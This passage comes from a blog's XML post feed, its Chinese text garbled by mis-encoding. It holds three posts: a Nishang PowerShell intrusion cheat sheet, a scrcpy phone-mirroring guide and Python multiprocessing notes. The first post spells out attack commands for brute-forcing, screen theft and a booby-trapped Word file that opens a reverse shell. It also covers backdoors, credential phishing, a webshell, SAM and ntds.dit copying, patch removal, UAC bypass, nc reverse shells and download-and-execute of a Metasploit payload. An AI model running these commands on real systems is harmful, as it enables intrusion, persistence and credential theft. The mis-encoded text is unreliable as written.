Invoke-BruteForce #å‘½ä»¤å‚æ•°å¦‚ä¸‹ -ComputerName # å¯¹åº”æœåŠ¡çš„è®¡ç®—æœºå -UserList ç”¨æˆ·åå­—å…¸ -PasswordList å¯†ç å­—å…¸ -Service æœåŠ¡ï¼ˆé»˜è®¤ä¸ºï¼šSQLï¼‰ -StopOnSuccess åŒ¹é…ä¸€ä¸ªååœæ­¢ -Delay å»¶è¿Ÿæ—¶é—´ #æ¯”å¦‚ Invoke-BruteForce -ComputerName xx-PC -UserList user.txt -PasswordList pass.txt -Service ActiveDirectory -Verbose # å†…ç½‘æ‰«æå™¨ # ç”¨äºå¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œæ‰“å¼€æœ¬åœ°ç›‘å¬ï¼Œç„¶åè¿œç¨‹ä¼ é€æ•°æ®ï¼ŒæŠŠæŠŠå‘é€ç»™FireListener #1.åœ¨æœ¬æœºå¼€å¯ç›‘å¬ FireListener 130-150 #2.åœ¨ç›®æ ‡æœºå™¨è¾“å…¥å‘½ä»¤ï¼š FireListener 192.168.0.107 130-150 -Verbose ## å†…ç½‘å—…æ¢ åŠ¨é™å¾ˆå¤§ï¼Œå®åœ¨æ²¡æœ‰åŠæ³•çš„æ—¶å€™å¯ä»¥è¯•è¯• ç›®æ ‡æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999 æœ¬æœºç›‘å¬ nc -lvvp 9999 ## å±å¹•çªƒå– Show-TargetScreen #æœ¬æœºå¯ä»¥ä½¿ç”¨ncè·å–powercatè¿›è¡Œç›‘å¬ï¼ˆåœ¨æœ¬åœ°ä½¿ç”¨æ”¯æŒMJPEGçš„æµè§ˆå™¨æ¯”å¦‚firefoxï¼Œè®¿é—®æœ¬æœºå¯¹åº”ç›‘å¬ç«¯å£ï¼Œå³å¯åœ¨æµè§ˆå™¨ä¸Šçœ‹åˆ°ä»è¿œç«¯ä¼ è¾“å›æ¥çš„å®æ—¶ç”»é¢ï¼Œæ­£å‘åå‘å‡å¯ï¼‰ Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443 # å°†è¿œç¨‹çš„ç”»é¢ä¼ è¾“ç»™ 192.168.230.1 çš„443ç«¯å£ å‚æ•°ï¼š Bind --> æ­£å‘è¿æ¥ åœ¨ç›®æ ‡æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆåå‘è¿æ¥ï¼‰ Show-TargetScreen -IPAddress 192.168.230.172 -Port 3333 æœ¬æœºè¾“å…¥ä»¥ä¸‹å‘½ä»¤ ï¼Œæ¥ç€è®¿é—®æœ¬æœºçš„9999ç«¯å£ nc -nlvp 3333 | nc -nlvp 9999 æ­£å‘è¿æ¥ ç›®æ ‡æœºæ‰§è¡Œï¼š Show-TargetScreen -Bind -Port 3333 æœ¬æœºæ‰§è¡Œï¼š nc -nv 192.168.230.37 3333 | nc -lnvp 9999 ## Client çš„ç”Ÿæˆ(ç±»ä¼¼æœ¨é©¬) éœ€è¦è‡ªå·±ç»‘å®špayload é¦–å…ˆåœ¨æœ¬æœºç›‘å¬ï¼š nc -lvp 4444 æ¥ç€åˆ¶ä½œwordæ–‡ä»¶ï¼Œæ‰“å¼€\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1æ–‡ä»¶ï¼Œå¤åˆ¶ç¬¬ä¸‰è¡Œçš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª`TcpClient`çš„å‚æ•°ï¼Œè¿™å°±æ˜¯è¿œç¨‹è¿æ¥çš„åœ°å€ï¼ŒæŠŠä»–æ”¹ä¸ºæœ¬æœºçš„IPå’Œä½ ç›‘å¬çš„ç«¯å£ï¼Œæ”¹å®Œä»¥åå¤åˆ¶ä»£ç ï¼Œåœ¨å‘½ä»¤è¡Œä¸‹å¦‚ä¸‹æ‰§è¡Œ Invoke-Encode -DataToEncode 'å¤åˆ¶çš„ä»£ç ' -IsString -PostScript æ‰§è¡Œå®Œä¹‹åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯encode.txtï¼Œ ä¸€ä¸ªæ˜¯encodedcommand.txt æ¥ç€æ‰§è¡Œå‘½ä»¤ Out-Word-PayloadScript .\encodedcommand.txt ä¼šç”Ÿæˆä¸€ä¸ªwordæ–‡æ¡£ï¼Œç”¨æˆ·æ‰“å¼€å°±ä¸­æ‹›ï¼Œæˆ‘ä»¬è·å–åˆ°åå¼¹çš„powershell ## åé—¨ 1.Http-Backdoor å¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸‹è½½å’Œæ‰§è¡Œpowershellè„šæœ¬ï¼Œæ¥æ”¶æ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™çš„åˆ¶å®šï¼Œç„¶ååœ¨å†…å­˜ä¸­æ‰§è¡Œpowershellè„šæœ¬ 2.Add-ScrnSaveBackdoor åˆ©ç”¨windowsçš„å±ä¿æ¥ç•™ä¸‹ä¸€ä¸ªéšè—çš„åé—¨ 3.Execute-OnTime ä¸Http-Backdoorç›¸æ¯”ï¼Œå¤šäº†å®šæ—¶åŠŸèƒ½ 4.Invoke-ADSBackdoor ä½¿ç”¨NTFSæ•°æ®æµç•™ä¸‹çš„ä¸€ä¸ªæ°¸ä¹…åé—¨ æœ€ææ€–çš„åé—¨ ## é’“é±¼æ”»å‡»(æœ‰é“ç”¨æˆ·è¾“å…¥è‡ªå·±æœºå™¨çš„å¯†ç ) Invoke-CredentialsPhish ## webshellåé—¨ ä½äº \nishang\Antak-WebShellç›®å½•ä¸‹ å°±æ˜¯ä¸€ä¸ªaspçš„å¤§é©¬ï¼ˆä½¿ç”¨çš„æ˜¯powershellçš„å‘½ä»¤ï¼Œæ¯”cmdå‘½ä»¤å¼ºå¤§ï¼‰ # å¤åˆ¶samæ–‡ä»¶ï¼ˆå¦‚æœè¿è¡Œåœ¨DCæœºä¸Šï¼Œntds.ditå’ŒSYSTEM hiveä¹Ÿèƒ½è¢«æ‹·è´å‡ºæ¥ï¼‰ Copy-VSS # ç›´æ¥æŠŠæ–‡ä»¶ä¿å­˜åœ¨å½“å‰è·¯å¾„ä¸‹ Copy-VSS -DEstinationDir C:temp # åˆ¶å®šæ–‡ä»¶ä¿å­˜è·¯å¾„ï¼ˆå¿…é¡»æ˜¯å·²å­˜åœ¨çš„è·¯å¾„ï¼‰ ## å…¶ä»–...... åç»­æ§åˆ¶# windowsä¸Šæ²¡æœ‰ncï¼Œéœ€è¦æå‰ä¸Šä¼ ä¸€ä¸ªnc.exeï¼Œæ¨èLinux ## No1.åå‘è¿æ¥ï¼ˆæˆ‘ç”¨å…¬ç½‘æ¥è¿æ¥ç›®æ ‡å†…ç½‘ï¼Œå› ä¸ºæˆ‘è·å–ä¸åˆ°å†…ç½‘çš„å…¬ç½‘ipï¼‰ åœ¨Shellsç›®å½•ä¸‹é¢ #1.æ”»å‡»æœºå™¨ä¸Š NCä¸‹æ‰§è¡Œ: nc -lvp 3333 #2.åœ¨ç›®æ ‡æœåŠ¡å™¨ PowerShellä¸‹æ‰§è¡Œï¼š TCOçš„ Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.103 -Port 3333 ## NO2.æ­£å‘è¿æ¥: #1.ç›®æ ‡ PowerShellä¸‹æ‰§è¡Œ: TCPçš„ï¼Œ å¦å¤–è¿˜æœ‰UDPçš„: Invoke-PowerShellTcp -Bind -Port 3333 #NCä¸‹æ‰§è¡Œ: è¯·æ±‚ä»–çš„3333ç«¯å£ nc -nv 192.168.0.103 3333 ### åŸºäºUDP( Invoke-PowerShellUdp )ï¼Œ ncå‘½ä»¤æœ‰ç‚¹ä¸åŒ æ­£å‘è¿æ¥ nc -nvu 192.168.0.103 3333 åå‘è¿æ¥ nc lup 3333 ### åŸºäºhttpå’Œhttps ï¼ˆ Invoke-PoshRatHttp ï¼‰ ### æ­¤å¤–,è¿˜æœ‰httpçš„shell(æ‰§è¡Œå®Œä¼šç”Ÿæˆä¸€æ¡å‘½ä»¤ï¼Œç„¶å???) Invoke-PoshRatHttp -Reverse -IPAddress 192.168.0.103 -Port 3333 Invoke-PoshRatHttps -Reverse -IPAddress 192.168.0.103 -Port 3333 # ç„¶åå°†ç”Ÿæˆçš„å‘½ä»¤å¤åˆ¶åˆ°`ç›®æ ‡æœº`cmdæ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•ä¼šè‡ªåŠ¨æ¶ˆå¤±ï¼Œç„¶ååœ¨æœ¬æœºçš„powershellä¸‹ä¼šè¿”å›ç›®æ ‡æœºçš„ä¼šè¯ åŸŸæ¸—é€åœ¨nishangç›®å½•ä¸‹é¢çš„ActiveDirectoryä¸‹é¢ ç–‘éš¾æ‚ç—‡1.çœŸå®æ¡ˆä¾‹åˆ†æ 2.å„ç§å®‰å…¨é™åˆ¶ æ— è§£æ æ— æƒé™ æ— æ‰§è¡Œ ç³»ç»Ÿææƒ åŸºäºæ•°æ®åº“ åŸºäºæ¼æ´ï¼ˆå¸¸ç”¨ï¼Œå¦‚æœç”µè„‘æ²¡è¡¥ä¸ï¼Œå¯ä»¥åˆ é™¤è¡¥ä¸ï¼‰ ç¬¬ä¸‰æ–¹è½¯ä»¶ # æŸ¥çœ‹ç³»ç»Ÿçš„è¡¥ä¸ systeminfo # åˆ é™¤è¡¥ä¸ Remove-Update # ç„¶åè¾“å…¥è¡¥ä¸ç¼–å· # åˆ é™¤å…¨éƒ¨è¡¥ä¸ Remove-Update All # åˆ é™¤å…¨éƒ¨çš„å®‰å…¨è¡¥ä¸ Remove-Update Security # åˆ é™¤æŒ‡å®šçš„è¡¥ä¸ Remove-Update KB2761226 #### Bypass UAC : æ¨¡å—:Invoke-PsUACme UAC (ç”¨æˆ·è´¦æˆ·æ§åˆ¶) Get-Help è·å–å¸®åŠ© powershellä¸‹è½½æ–‡ä»¶(nishang)$client = new-object System.Net.WebClient $client.DownloadFile('#1', '#2') #1æ˜¯éœ€è¦ä¸‹è½½æ–‡ä»¶çš„url #2æ˜¯ä¿å­˜ä¸ºæœ¬åœ°æ–‡ä»¶çš„è·¯å¾„ï¼ŒåŒ…æ‹¬æ–‡ä»¶å ä¾‹å¦‚ï¼š $client.DownloadFile('https://www.2cto.com/net/201611/562900.html', 'D:/562900.html') # æˆ–è€…è¿™ä¸ªæ–¹æ³• $src = 'https://www.pstips.net/index.php' $des = "$env:temp\index.php" Invoke-WebRequest -uri $src -OutFile $des Unblock-File $des # ä¸‹è½½å®Œä¹‹åå°±å¯ä»¥ç”¨å•¦ ## ä¸‹è½½æ‰§è¡Œ Download_Execute ä¸‹è½½æ–‡æœ¬æ–‡ä»¶ï¼Œç„¶åè½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œ åˆ©ç”¨exetotext.ps1æŠŠmsfç”Ÿæˆçš„æœ¨é©¬ç«¯`msf.exe`æ›´æ”¹ä¸º`msf.txt`æ–‡ä»¶ ExetoTxt c:msf.exe c:msf.txt ç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œè°ƒç”¨`Download Execute`è„šæœ¬ä¸‹è½½å¹¶æ‰§è¡Œè¯¥æ–‡ä»¶ Download Execute http://192.168.110.128/msf.txt è¿™æ—¶ï¼Œmsfçš„ç›‘å¬ç«¯å°±ä¼šæˆåŠŸè·å¾—åå¼¹å›æ¥çš„shell powershellæ˜¯æ²¡æœ‰æ€æ¯’è½¯ä»¶æç¤ºçš„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å†…ç½‘</tag>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrcpy-æ‰‹æœºä¸ç”µè„‘æŠ•å±ç¥å™¨]]></title>
    <url>%2Fposts%2F50980%2F</url>
    <content type="text"><![CDATA[scrcpy å®‰è£…snap install scrcpy adbæœåŠ¡å®‰è£…sudo apt-get install android-tools-adb adbé…ç½®æ‰‹æœºé€šè¿‡USBè¿æ¥ç”µè„‘lsusb æ‰¾åˆ°è‡ªå·±æ‰‹æœºçš„è¯†åˆ«å·,(å¯ä»¥å¯¹æ¯”æ•°æ®çº¿æ’å…¥ä¹‹å‰å’Œæ’å…¥ä¹‹åå¤šäº†å“ªä¸ªå°±æ˜¯å“ªä¸ª) åˆ›å»ºè®¾å¤‡æ–‡ä»¶ä¸‹é¢æ‰€æœ‰çš„04e8æ”¹æˆè‡ªå·±çš„è¯†åˆ«å·, android.rulesæ–‡ä»¶åå¯è‡ªå®šä¹‰ mkdir ~/.android # æ³¨æ„ä½ çš„è®¾å¤‡å· echo 0x04e8 > ~/.android/adb_usb.ini sudo touch /etc/udev/rules.d/android.rules sudo gedit /etc/udev/rules.d/android.rules åœ¨æ–‡ä»¶ä¸­è¾“å…¥:æ³¨æ„è‡ªå·±çš„è®¾å¤‡å· SUBSYSTEM=="usb", SYSFS{idVendor}=="ä½ çš„è®¾å¤‡å·", MODE="0666" ä¿å­˜åä¿®æ”¹æ–‡ä»¶æƒé™sudo chmod 777 /etc/udev/rules.d/android.rules å¯åŠ¨adbæœåŠ¡service udev restart adb start-server adb devices æœ‰è®¾å¤‡å°±è¯´æ˜æˆåŠŸäº†, å¦‚æœæ²¡æœ‰çœ‹çœ‹è‡ªå·±æ‰‹æœºçš„å¼€å‘è€…æ¨¡å¼ä»¥åŠUSBè°ƒè¯•æœ‰æ²¡æœ‰æ‰“å¼€ ä½¿ç”¨scrcpyå‘½ä»¤è¡Œè¾“å…¥ # ç›´æ¥ä½¿ç”¨ scrcpy # è®¾ç½®æ˜¾ç¤ºå°ºå¯¸ä¸º1080 nohun scrcpy -m 1080 &amp; å°±ä¼šå¼¹å‡ºç•Œé¢äº† scrcpyä½¿ç”¨æ–¹æ³•""" é¼ æ ‡å·¦é”®ç‚¹å‡»ã€æ»‘åŠ¨; é•¿æŒ‰é¼ æ ‡ä¸­é”®å›åˆ°ä¸»å±å¹•;Ctrl+Shift+V é¼ æ ‡å³é”®è¿”å›å¤åˆ¶æ–‡æœ¬ç”µè„‘åˆ°æ‰‹æœº: ç”µè„‘ä¸Šå¤åˆ¶å, åœ¨æ‰‹æœºæŠ•å±ç•Œé¢æŒ‰Ctrl+Shift+Vå¤åˆ¶åˆ°æ‰‹æœºå‰ªåˆ‡æ¿, ç„¶åæ‰‹æœºä¸­ç²˜è´´æ‰‹æœºåˆ°ç”µè„‘: æ‰‹æœºä¸Šå¤åˆ¶åˆ°å‰ªåˆ‡æ¿ä¸­, åœ¨æŠ•å±ç•Œé¢æŒ‰ä¸‹Ctrl+Cé”®ï¼Œå†åˆ°ç”µè„‘æ­£å¸¸ä¸Šç²˜è´´ä¼ è¾“æ–‡ä»¶: ç›´æ¥åœ¨æ–‡ä»¶ç®¡ç†å™¨å¤åˆ¶ç²˜è´´ """ å¿«æ·é”®å…¨å±/å›åˆ°åˆé€‚å°ºå¯¸ctrl +f ctrl + x å±•å¼€/æŠ˜å é€šçŸ¥æ ctrl +n ctrl + shift + n ç»“æŸæŠ•å±scrcpy -S æˆ–è€…å…³æ‰æ˜¾ç¤ºçª—å£å³å¯ Scrcpy çš„å‘½ä»¤å‚æ•° å…³é—­æ‰‹æœºå±å¹• scrcpy -S é™åˆ¶ç”»é¢åˆ†è¾¨ç‡ scrcpy -m 1024 (æ¯”å¦‚é™åˆ¶ä¸º 1024) ä¿®æ”¹è§†é¢‘ç ç‡ scrcpy -b 4M (é»˜è®¤ 8Mbpsï¼Œæ”¹æˆ 4Mbps) è£å‰ªç”»é¢ scrcpy -c 1224:1440:0:0 è¡¨ç¤ºåˆ†è¾¨ç‡ 1224x1440 å¹¶ä¸”åç§»åæ ‡ä¸º (0,0) å¤šè®¾å¤‡åˆ‡æ¢ scrcpy -s è®¾å¤‡ID (ä½¿ç”¨ adb devices å‘½ä»¤æŸ¥çœ‹è®¾å¤‡ID) çª—å£ç½®é¡¶ scrcpy -T æ˜¾ç¤ºè§¦æ‘¸ç‚¹å‡» scrcpy -t åœ¨æ¼”ç¤ºæˆ–å½•åˆ¶æ•™ç¨‹æ—¶ï¼Œå¯åœ¨ç”»é¢ä¸Šå¯¹åº”æ˜¾ç¤ºå‡ºç‚¹å‡»åŠ¨ä½œ å…¨å±æ˜¾ç¤º scrcpy -f æ–‡ä»¶ä¼ è¾“é»˜è®¤è·¯å¾„ scrcpy --push-target /ä½ çš„/ç›®å½• å°†æ–‡ä»¶æ‹–æ”¾åˆ° scrcpy å¯ä»¥ä¼ è¾“æ–‡ä»¶ï¼Œæ­¤å‘½ä»¤æŒ‡å®šé»˜è®¤ä¿å­˜ç›®å½• åªè¯»æ¨¡å¼(ä»…æ˜¾ç¤ºä¸æ§åˆ¶) scrcpy -n å±å¹•å½•åƒ scrcpy -r è§†é¢‘æ–‡ä»¶å.mp4 æˆ– .mkv å±å¹•å½•åƒ (ç¦ç”¨ç”µè„‘æ˜¾ç¤º) scrcpy -Nr æ–‡ä»¶å.mkv è®¾ç½®çª—å£æ ‡é¢˜ scrcpy --window-title 'å¼‚æ¬¡å…ƒå¥½æ£’ï¼' åŒæ­¥ä¼ è¾“å£°éŸ³ å¯å€ŸåŠ© USBaudio è¿™ä¸ªå¼€æºé¡¹ç›®å®ç°ï¼Œä½†ä»…æ”¯æŒ Linux ç³»ç»Ÿ Scrcpy å¿«æ·é”®åˆ—è¡¨ åˆ‡æ¢å…¨å±æ¨¡å¼ Ctrl+F å°†çª—å£è°ƒæ•´ä¸º1ï¼š1ï¼ˆå®Œç¾åƒç´ ï¼‰ Ctrl+G è°ƒæ•´çª—å£å¤§å°ä»¥åˆ é™¤é»‘è‰²è¾¹æ¡† Ctrl+X \ åŒå‡»é»‘è‰²èƒŒæ™¯ è®¾å¤‡ HOME é”® Ctrl+H \ é¼ æ ‡ä¸­é”® è®¾å¤‡ BACK é”® Ctrl+B \ é¼ æ ‡å³é”® è®¾å¤‡ ä»»åŠ¡ç®¡ç† é”® (åˆ‡æ¢APP) Ctrl+S è®¾å¤‡ èœå• é”® Ctrl+M è®¾å¤‡éŸ³é‡+é”® Ctrl+â†‘ è®¾å¤‡éŸ³é‡-é”® Ctrl+â†“ è®¾å¤‡ç”µæºé”® Ctrl+P ç‚¹äº®æ‰‹æœºå±å¹• é¼ æ ‡å³é”® å¤åˆ¶å†…å®¹åˆ°è®¾å¤‡ Ctrl+V å¯ç”¨/ç¦ç”¨ FPS è®¡æ•°å™¨ï¼ˆstdoutï¼‰ Ctrl+i å®‰è£…APK å°† apk æ–‡ä»¶æ‹–å…¥æŠ•å± ä¼ è¾“æ–‡ä»¶åˆ°è®¾å¤‡ å°†æ–‡ä»¶æ‹–å…¥æŠ•å±ï¼ˆéapkï¼‰ æŠ•å±å¹¶å½•å±ï¼šscrcpy -r file.mp4 ä¸æŠ•å±åªå½•å±ï¼šscrcpy -Nr file.mp4 å½•åˆ¶å£°éŸ³ç»“åˆï¼šhttps://github.com/rom1v/usbaudio document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>scrcpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-è¿›ç¨‹]]></title>
    <url>%2Fposts%2F58862%2F</url>
    <content type="text"><![CDATA[å¹¶å‘ï¼š ä»»åŠ¡æ•°å¤§äºcpuä¸ªæ•° å¹¶è¡Œï¼š cpuä¸ªæ•°å’Œä»»åŠ¡æ•°ç›¸åŒ GIL é”: ä»»ä½•pythonè¿›ç¨‹ä¸­ï¼Œä¸€æ¬¡æ°¸è¿œåªæœ‰ä¸€ä¸ªçº¿ç¨‹è¿è¡Œ ä¸€ä¸ªpythonè¿›ç¨‹ åªèƒ½æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹ åˆ›å»ºè¿›ç¨‹## ä¸åŒæ“ä½œç³»ç»Ÿåˆ›å»ºè¿›ç¨‹çš„åŒºåˆ«ï¼š #linuxä¸Š: fork() import os import time pid = os.fork() # è¿™ä¸ªåœ°æ–¹ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œ ä»–çš„pidå·å€¼æ°¸è¿œä¸º0 if pid == 0: print("æˆ‘æ˜¯å­è¿›ç¨‹") time.sleep(3) else: print("æˆ‘æ˜¯çˆ¶è¿›ç¨‹") time.sleep(3) # winä¸Šåˆ›å»ºè¿›ç¨‹ ç±»ä¼¼äºå¯¼å…¥æœºåˆ¶ éƒ½é€šç”¨çš„ import multiprocessing def func(): print("000") if __name__ == '__main__': p = multiprocessing.Process(target=func) # ç”Ÿæˆè¿›ç¨‹, ä¼ å‚target= ï¼Œargs= p.start() # å¼€å¯è¿›ç¨‹ï¼Œ ç›¸å½“äºä¸€ä¸ªå­è¿›ç¨‹ è¿›ç¨‹æ ‡è¯†# è¿›ç¨‹æ ‡è¯† pid import time import os import multiprocessing def func(): time.sleep(5) if __name__ == "__main__": print("main pid ", os.getpid()) # å½“å‰è¿›ç¨‹çš„ print(multiprocessing.current_process().pid) p = multiprocessing.Process(target=func) print(p.pid) p.start() # startä¹‹åæ‰æœ‰pidå· print(p.pid) time.sleep(10) # çº¿ç¨‹çš„æ ‡è¯†æ˜¯ ident # æ“ä½œç³»ç»Ÿè°ƒç”¨çš„æ˜¯è¿›ç¨‹ """ æ³¨æ„ï¼ æ“ä½œç³»ç»Ÿå¹¶ä¸èƒ½çœ‹åˆ°çº¿ç¨‹çš„æ ‡è¯†ã€‚ å› ä¸ºï¼Œçº¿ç¨‹æ˜¯ç”±Pythonè§£é‡Šå™¨ æ¥è´Ÿè´£è°ƒåº¦çš„ã€‚ æ“ä½œç³»ç»Ÿä»…éœ€è¦è°ƒåº¦è¿›ç¨‹å°±è¡Œäº† """ å®ˆæŠ¤è¿›ç¨‹# å®ˆæŠ¤è¿›ç¨‹ daemon = True ä¸»è¿›ç¨‹ç»“æŸä¹‹åï¼Œå­è¿›ç¨‹è·Ÿç€ç»“æŸï¼ˆæŸå­è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸéšç€ä¸»è¿›ç¨‹ï¼‰ import time import multiprocessing def func(): time.sleep(20) print("å­è¿›ç¨‹ç»“æŸ") if __name__ == "__main__": p = multiprocessing.Process(target=func, daemon = True) p.daemon = True # è®¾ç½®æˆå®ˆæŠ¤è¿›ç¨‹ p Trueä¼šéšç€ä¸»è¿›ç¨‹ç»“æŸè€Œç»“æŸï¼Œ ä¸»è¿›ç¨‹ä¸ä¼šç­‰å¾…å­è¿›ç¨‹ç»“æŸ p.start() time.sleep(3) ç»ˆæ­¢è¿›ç¨‹# ç»ˆæ­¢è¿›ç¨‹ import multiprocessing import time def func(): time.sleep(5) print(multiprocessing.current_process()) if __name__ == "__main__": p = multiprocessing.Process(target=func) p.start() time.sleep(2) # ä¸»è¿›ç¨‹2s p.terminate() # ç»“æŸ,ä¸»è¿›ç¨‹ç»“æŸï¼Œä¸ç®¡å­è¿›ç¨‹æœ‰æ²¡æœ‰ç»“æŸï¼Œå°±ç»ˆæ­¢å­è¿›ç¨‹ï¼ˆçº¿ç¨‹æ²¡æœ‰è¿™ä¸ªï¼‰ é¢å‘å¯¹è±¡# é¢å‘å¯¹è±¡ ç±»ç»§æ‰¿åˆ›å»ºè¿›ç¨‹ # start() --> run(å·²ç»æ˜¯åœ¨æ–°çš„è¿›ç¨‹äº†) --> target # targetæ˜¯ç”±é»˜è®¤çš„runè¿è¡Œ import multiprocessing import time class My_Process(multiprocessing.Process): def __init__(self, *args, **kwargs): super().__init__(args, kwargs) print("åˆå§‹åŒ–...") def run(self): """ start é»˜è®¤è°ƒç”¨çš„æ–¹æ³• é‡å†™å•¦åœ¨è¿™é‡Œ :return: """ print("run...") self.task() time.sleep(5) def task(self): print("task...") if __name__ == "__main__": p = My_Process() p.start() # start æ–¹æ³•ä¼šè°ƒç”¨run # åˆ›å»ºè¿›ç¨‹çš„æ–¹å¼ ï¼š multiprocessing.Process ç±»ç»§æ‰¿ï¼Œé‡å†™run linuxä¸‹ï¼šfork # å¦‚æœæ¢æˆæ˜¯çº¿ç¨‹çš„è¯ï¼šæ¢æ‰ç»§æ‰¿ç±»å°±è¡Œ è¿›ç¨‹é€šä¿¡# -*- coding:utf-8 -*- import multiprocessing from multiprocessing import Manager # ç®¡ç†å™¨ def func(l): l.append(111) if __name__ == '__main__': manager = Manager() # å®ä¾‹åŒ– å…ˆå¼€å¯ä¸€ä¸ªå…¬å…±è¿›ç¨‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªç®¡ç†å™¨ l = manager.list() # å¼€å¯ç©ºé—´ï¼Œå·¦è¾¹å°±æ˜¯ä»£ç† # l = manager.dict() """ ä¸€èˆ¬å¸¸ç”¨çš„ç©ºé—´ç±»å‹æ˜¯ï¼š 1. mgr.list() 2. mgr.dict() 3. mgr.Queue() """ print(l) p = multiprocessing.Process(target=func, args=(l,)) p.start() p.join() print(l) # è¿™æ ·ä½¿ç”¨managerä¹‹å lå°±æ˜¯ã€å…±äº«ã€‘çš„äº† è¿›ç¨‹æ±  &amp; çº¿ç¨‹æ±  ps:æœ‰ç‚¹ä¹± # from multiprocessing import Pool # è¿›ç¨‹æ±  from multiprocessing.dummy import Pool #çº¿ç¨‹æ±  from multiprocessing.pool import ThreadPool # çº¿ç¨‹æ±  import threading import time def func(i): print("{}-------555".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print("å¤„ç†æ•°æ®å®Œæˆ",args, kwargs) pool = Pool(6) # ä¸å†™çš„è¯ é»˜è®¤æ˜¯cpuçš„ä¸ªæ•° # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## æ·»åŠ ä»»åŠ¡ ä¸é˜»å¡ ä¸»è¦ä½¿ç”¨çš„æ–¹æ³• # pool.apply(func=func, ) ## æ·»åŠ ä»»åŠ¡ é˜»å¡ # pool.map(func, [i for i in range(5)]) #æ·»åŠ ä»»åŠ¡ ä¸é˜»å¡ pool.close() #å…³é—­çº¿ç¨‹æ±  ä¸åœ¨æäº¤æ–°çš„ä»»åŠ¡ pool.join() #ç­‰å¾…è¿›ç¨‹æ± ä¸­çš„ä»»åŠ¡æ‰§è¡Œå®Œæ¯• print("ä»»åŠ¡ç»“æŸ") ########### çº¿ç¨‹æ± çš„æ­¥éª¤ p = ThreadPool(3) # å®ä¾‹åŒ– p.apply_async(func) # å‡½æ•° # å¯ä»¥å°†è¿”å›å€¼.get() ä½†æ˜¯getä¹Ÿä¼šié˜»å¡ p.close() p.join() # join()è¯­å¥è¦æ”¾åœ¨close()è¯­å¥åé¢ # è¿›ç¨‹æ± æ¯”çº¿ç¨‹æ± è€—è´¹èµ„æº # å¯ä»¥å°†è¿”å›å€¼.get() ä½†æ˜¯getä¹Ÿä¼šié˜»å¡ async_result = p.apply_async(func) # å‡½æ•° print(async_result.get()) ä½¿ç”¨è¿›ç¨‹æ± æ¥å®ç°å¹¶å‘æœåŠ¡å™¨# ä½¿ç”¨æ± æ¥å®ç°å¹¶å‘æœåŠ¡å™¨ # å…ˆå¼€ä¸€ä¸ªè¿›ç¨‹æ± ï¼Œ æ¯ä¸ªè¿›ç¨‹ä¸‹é¢å†å¼€ä¸€ä¸ªçº¿ç¨‹ import socket from multiprocessing import Pool, cpu_count from multiprocessing.pool import ThreadPool def woeker_thread(conn): # ä½¿ç”¨çº¿ç¨‹æ± æ¥ while True: recv_data =conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break def worker_process(server): # ä½¿ç”¨è¿›ç¨‹æ± æ¥æ¥æ”¶å¥—æ¥å­— # pool = Pool(cpu_count()*2) # é€šå¸¸å¯ä»¥åˆ†é…2å€çš„cpuä¸ªæ•° pool = ThreadPool(cpu_count()) # è·å–ç”µè„‘æ ¸å¿ƒæ•° while True: conn, addr = server.accept() pool.apply_async(woeker_thread, args=(conn,)) if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) n = cpu_count() # è·å¾—å½“å‰è®¡ç®—æœºçš„cpuæ ¸å¿ƒæ•°é‡ pool = Pool(n) for i in range(n): # å……åˆ†åˆ©ç”¨cpuï¼Œä¸ºæ¯ä¸ªcpuåˆ†é…ä¸€ä¸ªè¿›ç¨‹ # conn, addr = server.accept() pool.apply_async(func=worker_process, args=(server,)) pool.apply_async(func=worker_process, args=(server,)) pool.close() pool.join() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
